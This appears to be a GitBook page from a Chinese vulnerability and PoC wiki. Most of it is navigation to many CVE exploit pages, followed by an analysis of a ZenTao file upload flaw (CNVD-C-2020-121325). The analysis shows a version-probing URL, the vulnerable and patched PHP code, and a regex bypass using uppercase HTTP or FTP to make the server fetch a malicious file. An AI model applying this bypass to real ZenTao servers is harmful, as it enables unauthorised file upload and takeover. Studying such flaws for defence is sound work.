+                <a href="../../Jenkins/Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）/">
+            
+                    
+                    Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.27" data-path="../../Jira/">
+            
+                <a href="../../Jira/">
+            
+                    
+                    Jira
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.28" data-path="../../Joomla/">
+            
+                <a href="../../Joomla/">
+            
+                    
+                    Joomla
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.28.1" data-path="../../Joomla/Joomla 3.7.0 SQL注入(CVE-2017-8917">
+            
+                <span>
+            
+                    
+                    Joomla 3.7.0 SQL注入(CVE-2017-8917)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.28.2" data-path="../../Joomla/Joomla 3.9.17 后台RCE（CVE-2020-11890）/">
+            
+                <a href="../../Joomla/Joomla 3.9.17 后台RCE（CVE-2020-11890）/">
+            
+                    
+                    Joomla 3.9.17 后台RCE（CVE-2020-11890）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.28.3" data-path="../../Joomla/Joomla 3.9.24 普通管理员RCE（CVE-2021-23132 ）/">
+            
+                <a href="../../Joomla/Joomla 3.9.24 普通管理员RCE（CVE-2021-23132 ）/">
+            
+                    
+                    Joomla 3.9.24 普通管理员RCE（CVE-2021-23132 ）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.29" data-path="../../Kibana/">
+            
+                <a href="../../Kibana/">
+            
+                    
+                    Kibana
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.29.1" data-path="../../Kibana/CVE-2019-7609/">
+            
+                <a href="../../Kibana/CVE-2019-7609/">
+            
+                    
+                    CVE 2019 7609
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.30" data-path="../../Nacos/">
+            
+                <a href="../../Nacos/">
+            
+                    
+                    Nacos
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.30.1" data-path="../../Nacos/Nacos未授权访问（CVE-2020-19676）/">
+            
+                <a href="../../Nacos/Nacos未授权访问（CVE-2020-19676）/">
+            
+                    
+                    Nacos未授权访问（CVE-2020-19676）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.31" data-path="../../Nexus/">
+            
+                <a href="../../Nexus/">
+            
+                    
+                    Nexus
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.31.1" data-path="../../Nexus/Nexus Repository Manager 3 访问控制缺失及远程代码执行漏洞（CVE-2019-7238）/">
+            
+                <a href="../../Nexus/Nexus Repository Manager 3 访问控制缺失及远程代码执行漏洞（CVE-2019-7238）/">
+            
+                    
+                    Nexus Repository Manager 3 访问控制缺失及远程代码执行漏洞（CVE-2019-7238）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.31.2" data-path="../../Nexus/Nexus Repository Manager 3 远程命令执行漏洞（CVE-2020-10204）/">
+            
+                <a href="../../Nexus/Nexus Repository Manager 3 远程命令执行漏洞（CVE-2020-10204）/">
+            
+                    
+                    Nexus Repository Manager 3 远程命令执行漏洞（CVE-2020-10204）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.32" data-path="../../phpMyAdmin/">
+            
+                <a href="../../phpMyAdmin/">
+            
+                    
+                    Php My Admin
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.33" data-path="../../SAP/">
+            
+                <a href="../../SAP/">
+            
+                    
+                    SAP
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.33.1" data-path="../../SAP/SAP NetWeaver AS JAVA 任意用户添加/">
+            
+                <a href="../../SAP/SAP NetWeaver AS JAVA 任意用户添加/">
+            
+                    
+                    SAP NetWeaver AS JAVA 任意用户添加
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.34" data-path="../../Spring/spring.html">
+            
+                <a href="../../Spring/spring.html">
+            
+                    
+                    Spring
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.34.1" data-path="../../Spring/Spring Boot Actuator 未授权访问/">
+            
+                <a href="../../Spring/Spring Boot Actuator 未授权访问/">
+            
+                    
+                    Spring Boot Actuator 未授权访问
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.34.2" data-path="../../Spring/Spring Cloud Config Server目录遍历（CVE-2020-5410）/">
+            
+                <a href="../../Spring/Spring Cloud Config Server目录遍历（CVE-2020-5410）/">
+            
+                    
+                    Spring Cloud Config Server目录遍历（CVE-2020-5410）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.34.3" data-path="../../Spring/Spring Data Commons 远程命令执行（CVE-2018-1273）/">
+            
+                <a href="../../Spring/Spring Data Commons 远程命令执行（CVE-2018-1273）/">
+            
+                    
+                    Spring Data Commons 远程命令执行（CVE-2018-1273）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.35" data-path="../../ThinkCMF/">
+            
+                <a href="../../ThinkCMF/">
+            
+                    
+                    Think CMF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.36" data-path="../../ThinkPHP/">
+            
+                <a href="../../ThinkPHP/">
+            
+                    
+                    Think PHP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.37" data-path="../../Vmware/">
+            
+                <a href="../../Vmware/">
+            
+                    
+                    Vmware
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.37.1" data-path="../../Vmware/VMware vCenter Server未授权RCE漏洞（CVE-2021-21972）/">
+            
+                <a href="../../Vmware/VMware vCenter Server未授权RCE漏洞（CVE-2021-21972）/">
+            
+                    
+                    VMware vCenter Server未授权RCE漏洞（CVE-2021-21972）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.37.2" data-path="../../Vmware/VMware vCenter Server远程代码执行漏洞（CVE-2021-21985）/">
+            
+                <a href="../../Vmware/VMware vCenter Server远程代码执行漏洞（CVE-2021-21985）/">
+            
+                    
+                    VMware vCenter Server远程代码执行漏洞（CVE-2021-21985）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.37.3" data-path="../../Vmware/VMware vCenter任意文件读取漏洞/">
+            
+                <a href="../../Vmware/VMware vCenter任意文件读取漏洞/">
+            
+                    
+                    VMware vCenter任意文件读取漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.37.4" data-path="../../Vmware/VMware View Planner 未授权RCE漏洞（CVE-2021-21978）/">
+            
+                <a href="../../Vmware/VMware View Planner 未授权RCE漏洞（CVE-2021-21978）/">
+            
+                    
+                    VMware View Planner 未授权RCE漏洞（CVE-2021-21978）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.37.5" data-path="../../Vmware/VMware vRealize Operations Manager SSRF（CVE-2021-21975）/">
+            
+                <a href="../../Vmware/VMware vRealize Operations Manager SSRF（CVE-2021-21975）/">
+            
+                    
+                    VMware vRealize Operations Manager SSRF（CVE-2021-21975）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.38" data-path="../../Weblogic/weblogic.html">
+            
+                <a href="../../Weblogic/weblogic.html">
+            
+                    
+                    Weblogic
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.38.1" data-path="../../Weblogic/[CVE-2017-10271]-XMLDecoder反序列化/">
+            
+                <a href="../../Weblogic/[CVE-2017-10271]-XMLDecoder反序列化/">
+            
+                    
+                    [CVE-2017-10271]-XMLDecoder反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.38.2" data-path="../../Weblogic/[CVE-2019-2725]-wls反序列化/">
+            
+                <a href="../../Weblogic/[CVE-2019-2725]-wls反序列化/">
+            
+                    
+                    [CVE-2019-2725]-wls反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.38.3" data-path="../../Weblogic/[CVE-2020-14644]-远程命令执行/">
+            
+                <a href="../../Weblogic/[CVE-2020-14644]-远程命令执行/">
+            
+                    
+                    [CVE-2020-14644]-远程命令执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.38.4" data-path="../../Weblogic/[CVE-2020-14645]-T3反序列化/">
+            
+                <a href="../../Weblogic/[CVE-2020-14645]-T3反序列化/">
+            
+                    
+                    [CVE-2020-14645]-T3反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.38.5" data-path="../../Weblogic/[CVE-2020-14756]-IIOP-T3反序列化/">
+            
+                <a href="../../Weblogic/[CVE-2020-14756]-IIOP-T3反序列化/">
+            
+                    
+                    [CVE-2020-14756]-IIOP-T3反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.38.6" data-path="../../Weblogic/[CVE-2020-14882]-未授权命令执行/">
+            
+                <a href="../../Weblogic/[CVE-2020-14882]-未授权命令执行/">
+            
+                    
+                    [CVE-2020-14882]-未授权命令执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.38.7" data-path="../../Weblogic/[CVE-2020-2551]-IIOP反序列化/">
+            
+                <a href="../../Weblogic/[CVE-2020-2551]-IIOP反序列化/">
+            
+                    
+                    [CVE-2020-2551]-IIOP反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.38.8" data-path="../../Weblogic/[CVE-2020-2555]-T3反序列化/">
+            
+                <a href="../../Weblogic/[CVE-2020-2555]-T3反序列化/">
+            
+                    
+                    [CVE-2020-2555]-T3反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.38.9" data-path="../../Weblogic/[CVE-2020-2883]-T3反序列化/">
+            
+                <a href="../../Weblogic/[CVE-2020-2883]-T3反序列化/">
+            
+                    
+                    [CVE-2020-2883]-T3反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.38.10" data-path="../../Weblogic/Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109.html">
+            
+                <a href="../../Weblogic/Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109.html">
+            
+                    
+                    Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.39" data-path="../../WordPress/">
+            
+                <a href="../../WordPress/">
+            
+                    
+                    Word Press
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.40" data-path="../../XXLjob/">
+            
+                <a href="../../XXLjob/">
+            
+                    
+                    XX Ljob
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.40.1" data-path="../../XXLjob/xxl-job API接口未授权访问RCE/">
+            
+                <a href="../../XXLjob/xxl-job API接口未授权访问RCE/">
+            
+                    
+                    xxl-job API接口未授权访问RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.41" data-path="../../Zabbix/">
+            
+                <a href="../../Zabbix/">
+            
+                    
+                    Zabbix
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.42" data-path="../../骑士CMS/">
+            
+                <a href="../../骑士CMS/">
+            
+                    
+                    骑士CMS
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.42.1" data-path="../../骑士CMS/骑士CMS远程代码执行/">
+            
+                <a href="../../骑士CMS/骑士CMS远程代码执行/">
+            
+                    
+                    骑士CMS远程代码执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本书使用 GitBook 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="&#x7985;&#x9053;-&#x5C0F;&#x4E8E;1242-&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;-cnvd-c-2020-121325">&#x7985;&#x9053; &#x5C0F;&#x4E8E;12.4.2 &#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E; CNVD-C-2020-121325</h1>
+<h2 id="&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;">&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;</h2>
+<p>&#x767E;&#x5EA6;&#x4E91;&#x5B89;&#x5168;&#x56E2;&#x961F;&#x76D1;&#x6D4B;&#x5230;&#x7985;&#x9053;&#x5B98;&#x65B9;&#x53D1;&#x5E03;&#x4E86;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x7684;&#x98CE;&#x9669;&#x901A;&#x544A;&#xFF0C;&#x8BE5;&#x6F0F;&#x6D1E;&#x7F16;&#x53F7;&#x4E3A;CNVD-C-2020-121325&#xFF0C;&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x7985;&#x9053;&lt;=12.4.2&#x7248;&#x672C;&#x3002;&#x767B;&#x9646;&#x7BA1;&#x7406;&#x540E;&#x53F0;&#x7684;&#x6076;&#x610F;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;fopen/fread/fwrite&#x65B9;&#x6CD5;&#x8BFB;&#x53D6;&#x6216;&#x4E0A;&#x4F20;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#xFF0C;&#x6210;&#x529F;&#x5229;&#x7528;&#x6B64;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x654F;&#x611F;&#x6587;&#x4EF6;&#x6216;&#x83B7;&#x5F97;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x6743;&#x9650;&#x3002;&#x6211;&#x4EEC;&#x5BF9;&#x6F0F;&#x6D1E;&#x8FDB;&#x884C;&#x4E86;&#x590D;&#x73B0;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x7531;&#x4E8E;&#x9700;&#x8981;&#x767B;&#x5F55;&#x540E;&#x53F0;&#x624D;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#xFF0C;&#x5B9E;&#x9645;&#x98CE;&#x9669;&#x76F8;&#x5BF9;&#x8F83;&#x4F4E;&#xFF0C;&#x5EFA;&#x8BAE;&#x53D7;&#x5F71;&#x54CD;&#x7684;&#x7985;&#x9053;&#x7528;&#x6237;&#x5C3D;&#x5FEB;&#x5347;&#x7EA7;&#x5230;&#x6700;&#x65B0;&#x7248;&#x3002;</p>
+<h2 id="&#x5F71;&#x54CD;&#x7248;&#x672C;">&#x5F71;&#x54CD;&#x7248;&#x672C;</h2>
+<blockquote>
+<p>[!NOTE]</p>
+<p>&#x7985;&#x9053; &lt;= 12.4.2&#x7248;&#x672C;</p>
+</blockquote>
+<h2 id="&#x73AF;&#x5883;&#x642D;&#x5EFA;">&#x73AF;&#x5883;&#x642D;&#x5EFA;</h2>
+<p>&#x767E;&#x5EA6;&#x4E0B;12.4.2&#x7684;&#x7985;&#x9053;&#x73AF;&#x5883;&#x6309;&#x6B65;&#x9AA4;&#x5B89;&#x88C5;&#x4E0B;&#x8F7D;&#x5373;&#x53EF;</p>
+<p><a href="https://www.zentao.net/" target="_blank">&#x7985;&#x9053;&#x5B98;&#x65B9;&#x7F51;&#x7AD9;</a></p>
+<p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="68a7bec7-4112-4aea-a8f2-43b6fadc2876" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<p>&#x8C03;&#x7528;&#x63A5;&#x53E3;&#x67E5;&#x8BE2;&#x7248;&#x672C;&#x4FE1;&#x606F;</p>
+<pre><code>http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig
+</code></pre><p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-14.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="8572303a-6686-4d40-b1df-f531bb228918" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-14.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;">&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2>
+<blockquote>
+<p>[!NOTE]</p>
+<p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x9700;&#x8981;&#x540E;&#x53F0;&#x6743;&#x9650;</p>
+</blockquote>
+<p>&#x6839;&#x636E;&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;&#x67E5;&#x770B;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x4EE3;&#x7801;&#x7247;&#x6BB5;</p>
+<p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="dc08bdac-2a84-4720-8d2e-cfb9ccdee70f" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<p><strong>&#x4FEE;&#x6539;&#x524D;</strong></p>
+<pre><code class="lang-php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">downloadZipPackage</span><span class="hljs-params">($version, $link)</span>
+</span>{
+    $decodeLink = helper::safe64Decode($link);
+    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&apos;/^https?\:\/\//&apos;</span>, $decodeLink)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">parent</span>::downloadZipPackage($version, $link);
+}
+</code></pre>
+<p><strong>&#x4FEE;&#x6539;&#x540E;</strong></p>
+<pre><code class="lang-php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">downloadZipPackage</span><span class="hljs-params">($version, $link)</span>
+</span>{
+    $decodeLink = helper::safe64Decode($link);
+    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&apos;/^https?\:\/\//&apos;</span>, $decodeLink)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+
+    $file      = basename($link);
+    $extension = substr($file, strrpos($file, <span class="hljs-string">&apos;.&apos;</span>) + <span class="hljs-number">1</span>);
+    <span class="hljs-keyword">if</span>(strpos(<span class="hljs-string">&quot;,{$this-&gt;config-&gt;file-&gt;allowed},&quot;</span>, <span class="hljs-string">&quot;,{$extension},&quot;</span>) === <span class="hljs-keyword">false</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">parent</span>::downloadZipPackage($version, $link);
+}
+</code></pre>
+<p>&#x8FD9;&#x91CC;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x4E3A;&#x7248;&#x672C;&#x548C;link&#x5730;&#x5740;&#xFF0C;&#x7136;&#x540E;base64&#x89E3;&#x7801;&#xFF0C;&#x6B63;&#x5219;&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;<strong>http</strong>&#x6216;<strong>https</strong>&#x534F;&#x8BAE;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x6B63;&#x5219;&#x8FC7;&#x6EE4;&#x5E76;&#x4E0D;&#x5B8C;&#x6574;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x7528;&#x4E8E;&#x4E0B;&#x8F7D;&#x6076;&#x610F;&#x6587;&#x4EF6;</p>
+<p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="23987b10-f0e2-440b-ba6e-a99ce912ddfb" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<p>&#x53EF;&#x4EE5;&#x5927;&#x5199;<strong>http</strong>&#x6216;&#x8BF7;&#x6C42;<strong>FTP</strong>&#x6765;&#x7ED5;&#x8FC7;&#x6B63;&#x5219;</p>
+<p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="21460881-0879-40c5-8e6c-0c92fe49c5eb" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="5c474be5-eddb-4eb0-82b1-fb0eb9b88360" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<p>&#x8DDF;&#x8FDB;&#x4E00;&#x4E0B;<strong>parent::downloadZipPackage</strong>&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x8DDF;&#x7740;&#x6765;&#x5230;<strong>zentao\module\client\model.php</strong>&#x6587;&#x4EF6;&#x4E2D;</p>
+<p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="80ffe147-83da-440d-a870-542273afbde2" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<pre><code class="lang-php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">downloadZipPackage</span><span class="hljs-params">($version, $link)</span>
+    </span>{
+        ignore_user_abort(<span class="hljs-keyword">true</span>);
+        set_time_limit(<span class="hljs-number">0</span>);
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($version) || <span class="hljs-keyword">empty</span>($link)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+        $dir  = <span class="hljs-string">&quot;data/client/&quot;</span> . $version . <span class="hljs-string">&apos;/&apos;</span>;
+        $link = helper::safe64Decode($link);
+        $file = basename($link);
+        <span class="hljs-keyword">if</span>(!is_dir($this-&gt;app-&gt;wwwRoot . $dir))
+        {
+            mkdir($this-&gt;app-&gt;wwwRoot . $dir, <span class="hljs-number">0755</span>, <span class="hljs-keyword">true</span>);
+        }
+        <span class="hljs-keyword">if</span>(!is_dir($this-&gt;app-&gt;wwwRoot . $dir)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+        <span class="hljs-keyword">if</span>(file_exists($this-&gt;app-&gt;wwwRoot . $dir . $file))
+        {
+            <span class="hljs-keyword">return</span> commonModel::getSysURL() . $this-&gt;config-&gt;webRoot . $dir . $file;
+        }
+        ob_clean();
+        ob_end_flush();
+
+        $local  = fopen($this-&gt;app-&gt;wwwRoot . $dir . $file, <span class="hljs-string">&apos;w&apos;</span>);
+        $remote = fopen($link, <span class="hljs-string">&apos;rb&apos;</span>);
+        <span class="hljs-keyword">if</span>($remote === <span class="hljs-keyword">false</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+        <span class="hljs-keyword">while</span>(!feof($remote))
+        {
+            $buffer = fread($remote, <span class="hljs-number">4096</span>);
+            fwrite($local, $buffer);
+        }
+        fclose($local);
+        fclose($remote);
+        <span class="hljs-keyword">return</span> commonModel::getSysURL() . $this-&gt;config-&gt;webRoot . $dir . $file;
+    }
+</code></pre>
+<p>&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x770B;&#x5230;&#x8FD9;&#x91CC;&#x83B7;&#x53D6;link&#x4F20;&#x5165;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x901A;&#x8FC7;<strong>fopen</strong>&#x6253;&#x5F00;&#x8BE5;&#x6587;&#x4EF6;&#xFF0C;&#x5199;&#x5165;&#x7985;&#x9053;&#x76EE;&#x5F55;<strong>www/data/client/version</strong>&#x4E2D;</p>
+<p>&#x67E5;&#x770B;&#x4E00;&#x4E0B;&#x6709;&#x6CA1;&#x6709;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x5730;&#x65B9;</p>
